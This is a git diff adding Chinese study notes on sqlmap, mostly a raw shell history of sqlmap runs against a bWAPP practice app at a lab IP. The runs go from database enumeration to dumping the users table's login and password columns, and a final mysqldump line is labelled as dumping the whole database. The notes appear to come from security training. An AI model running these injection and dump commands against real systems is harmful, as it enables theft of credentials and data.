@@ -42,3 +42,24 @@ sqlmap参数
         sqlmap --dbs #查询当前数据库有那些库存在  
         sqlmap --schema #查看源数据库（源）  
         sqlmap -a #显示所有信息  
+
+```shell
+  381  sqlmap -u http://10.0.0.8/bWAPP/sqli_17.php --cookie="security_level=0; PHPSESSID=d0c96f6bcc199ac381b801471373963b"  --level 5 --random-agent -f -b --dbs --users
+  382  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --dbs=mysql --level5 -t -b --database
+  383  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --dbs:mysql --level5 -t -b --database
+  384  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --dbs --level5 -t -b --database
+  385  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --dbs --level 5 -t -b --database
+  386  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --level 5 -t -b --dbs --database
+  387  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --level 5 -t -b --dbs 
+  388  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --level 5 -t -b --current-db
+  389  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --level 5 -t -b --current-table
+  390  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --level 5 -t -b --current-db
+  391  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --level 5 -t -b --tables
+  392  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --level 5 -t -b --tables -D bWAPP
+  393  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --level 5 -t -b -D bWAPP -T users --columns
+  394  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=1cd229d6b0dd28a76c837479ac947086; security_level=0"  --level 5 -t -b -D bWAPP -T users --dump -C "login,Password"
+  
+  sqlmap -u http://10.0.0.8/bWAPP/sqli_2.php\?movie\=1\&action\=go --cookie="PHPSESSID=0fb89681a682f570a2ad6d7834f0ba9d; security_level=0"  --level 5 -t -b -D bWAPP -T users --dump -C "login,Password" --is-dba
+```
+
+`mysqldump -A -R -E --triggers --master-data=2 --single-transaction > /tmp/full.sql` 脱库
